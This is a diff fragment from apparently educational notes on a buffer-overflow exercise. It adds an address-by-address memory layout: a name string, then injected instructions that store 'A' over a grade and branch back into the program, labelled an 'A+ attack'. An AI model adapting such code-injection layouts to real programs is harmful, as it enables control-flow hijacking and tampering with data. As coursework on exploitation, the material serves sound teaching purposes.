@@ -148,6 +148,20 @@ Address        Description
 0x42006C       MiniAssembler_strb(0,1);
 0x420070       MiniAssembler_b(0x400864, 0x420070);
 
+
+0x420058       S
+0x420059       e
+0x42005A       a
+0x42005B       n
+0x42005C       W
+0x42005D       \0
+0x42005E       \0
+0x42005F       \0
+0x420060       MiniAssembler_mov(0, 'A');
+0x420064       MiniAssembler_adr(1, 0x420044, 0x420064);
+0x420068       MiniAssembler_strb(0,1);
+0x42006C       MiniAssembler_b(0x400864, 0x42006C);
+
 A+ attack (to be deleted)
 
 0x420058       S
